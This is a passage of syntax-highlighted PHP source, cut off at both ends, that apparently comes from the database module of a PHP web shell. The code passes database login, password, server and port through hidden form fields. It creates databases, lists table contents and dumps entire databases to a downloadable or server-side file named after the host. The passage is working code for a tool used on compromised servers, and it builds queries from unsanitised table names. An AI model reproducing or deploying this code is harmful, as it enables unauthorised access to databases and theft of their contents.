class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_port</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_server</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_passwd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_login</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">sql</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">query</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_goto</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_goto</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_confirm</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Yes</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">No</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="p">}</span>
   <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">,</span><span class="nv">$acts</span><span class="p">))</span>
   <span class="p">{</span>
    <span class="cp">?&gt;</span><span class="x">&amp;lt;table border=&quot;0&quot; width=&quot;100%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;b&amp;gt;Create new table:&amp;lt;/b&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;newtbl&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_db&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;sql_newtbl&quot; size=&quot;20&quot;&amp;gt;&amp;nbsp;&amp;lt;input type=&quot;submit&quot; value=&quot;Create&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;b&amp;gt;Dump DB:&amp;lt;/b&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;dump&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_db&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;dump_file&quot; size=&quot;30&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">&quot;dump_&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nv">$sql_db</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d-m-Y-H-i-s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.sql&quot;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;nbsp;&amp;lt;input type=&quot;submit&quot; name=\&quot;submit\&quot; value=&quot;Dump&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span><span class="cp">&lt;?php</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;newtbl&quot;</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">((</span><span class="nb">mysql_create_db</span> <span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">))</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;DB </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> has been created with success!&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t create DB </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">.&amp;lt;br&amp;gt;Reason:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nx">mysql_smarterror</span><span class="p">();}</span>
   <span class="p">}</span>
   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;dump&quot;</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span>
    <span class="p">{</span>
     <span class="nv">$diplay</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">sql</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">dump</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_db</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_login</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_passwd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_server</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_port</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_tbl</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;SQL-Dump:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;DB:&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_db</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
     <span class="nv">$v</span> <span class="o">=</span> <span class="nb">join</span> <span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">,</span><span class="nv">$dmptbls</span><span class="p">);</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Only tables (explode </span><span class="se">\&quot;</span><span class="s2">;</span><span class="se">\&quot;</span><span class="s2">)&amp;nbsp;&amp;lt;b&amp;gt;&amp;lt;sup&amp;gt;1&amp;lt;/sup&amp;gt;&amp;lt;/b&amp;gt;:&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">dmptbls</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">+</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$dump_file</span><span class="p">)</span> <span class="p">{</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$dump_file</span><span class="p">;}</span>
     <span class="k">else</span> <span class="p">{</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="s2">&quot;./dump_&quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nv">$sql_db</span><span class="o">.</span><span class="s2">&quot;_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d-m-Y-H-i-s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.sql&quot;</span><span class="p">);}</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;File:&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_dump_file</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$tmp</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span><span class="o">+</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span> <span class="o">%</span> <span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Download: &amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_dump_download</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> checked&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Save to file: &amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_dump_savetofile</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> checked&amp;gt;&quot;</span><span class="p">;</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Dump</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;&amp;lt;sup&amp;gt;1&amp;lt;/sup&amp;gt;&amp;lt;/b&amp;gt; - all, if empty&quot;</span><span class="p">;</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
     <span class="nv">$diplay</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
     <span class="nv">$set</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
     <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;sock&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sql_sock</span><span class="p">;</span>
     <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;db&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sql_db</span><span class="p">;</span>
     <span class="nv">$dump_out</span> <span class="o">=</span> <span class="s2">&quot;download&quot;</span><span class="p">;</span>
     <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;print&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
     <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;nl2br&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
     <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
     <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$dump_file</span><span class="p">;</span>
     <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;add_drop&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
     <span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;onlytabs&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$dmptbls</span><span class="p">))</span> <span class="p">{</span><span class="nv">$set</span><span class="p">[</span><span class="s2">&quot;onlytabs&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">,</span><span class="nv">$dmptbls</span><span class="p">);}</span>
     <span class="nv">$ret</span> <span class="o">=</span> <span class="nx">mysql_dump</span><span class="p">(</span><span class="nv">$set</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_dump_download</span><span class="p">)</span>
     <span class="p">{</span>
      <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
      <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: application/octet-stream&quot;</span><span class="p">);</span>
      <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-length: &quot;</span><span class="o">.</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
      <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
      <span class="k">echo</span> <span class="nv">$ret</span><span class="p">;</span>
      <span class="k">exit</span><span class="p">;</span>
     <span class="p">}</span>
     <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sql_dump_savetofile</span><span class="p">)</span>
     <span class="p">{</span>
      <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Dump error! Can&#39;t write to </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">!&quot;</span><span class="p">;}</span>
      <span class="k">else</span>
      <span class="p">{</span>
       <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$ret</span><span class="p">);</span>
       <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Dumped! Dump has been writed to </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> (&quot;</span><span class="o">.</span><span class="nx">view_size</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$sql_dump_file</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;)&amp;lt;/b&amp;gt;.&quot;</span><span class="p">;</span>
      <span class="p">}</span>
     <span class="p">}</span>
     <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Dump: nothing to do!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
    <span class="p">}</span>
   <span class="p">}</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$diplay</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">))</span>
    <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_tbl_act</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_tbl_act</span> <span class="o">=</span> <span class="s2">&quot;browse&quot;</span><span class="p">;}</span>
     <span class="nv">$count</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT COUNT(*) FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;`;&quot;</span><span class="p">);</span>
     <span class="nv">$count_row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span>
     <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span>
     <span class="nv">$tbl_struct_result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW FIELDS FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;`;&quot;</span><span class="p">);</span>
     <span class="nv">$tbl_struct_fields</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
